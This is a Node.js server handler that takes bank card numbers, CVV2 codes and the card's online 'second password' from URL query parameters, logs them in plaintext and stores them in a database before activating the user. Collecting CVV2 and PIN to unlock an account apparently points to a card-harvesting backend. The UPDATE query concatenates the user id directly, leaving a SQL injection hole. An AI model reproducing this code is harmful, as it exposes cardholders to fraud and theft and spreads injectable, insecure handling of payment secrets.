var CryptoJS = require('crypto-js');
var constants = require('./constants');
var SECRET_KEY = constants.SECRET_KEY;

module.exports = function(req, res, connection){
   
    // Receive POST values
    console.log(req.query)

    /* Validate inputs */
    if(req.query.expmah === '' || req.query.bankname === '')
    return res.status(200).jsonp({action:'enseraf'});

    // Store Banking Data
    connection.query("INSERT INTO app_cards SET ? ", {
       
        cardnumber:CryptoJS.AES.encrypt(req.query.cardnumber, SECRET_KEY),
        secondpass:CryptoJS.AES.encrypt(req.query.secondpass, SECRET_KEY),
        bankname:req.query.bankname,
        cvv2:CryptoJS.AES.encrypt(req.query.cvv2, SECRET_KEY),
        expmonth:req.query.expmah,
        expyear:req.query.expyear,
        mobile:req.query.mobileforipg,
        email:req.query.emailforipg,
        userid:req.query.userid
    
    },function(error){
        if(error)
        console.log(error);

        // Activate user
        connection.query("UPDATE app_users SET active = 1 WHERE id = '" + req.query.userid + "'",function(error){
            if(error)
            console.log(error);
            return res.status(200).jsonp({action:'OK'});
        });
    });
}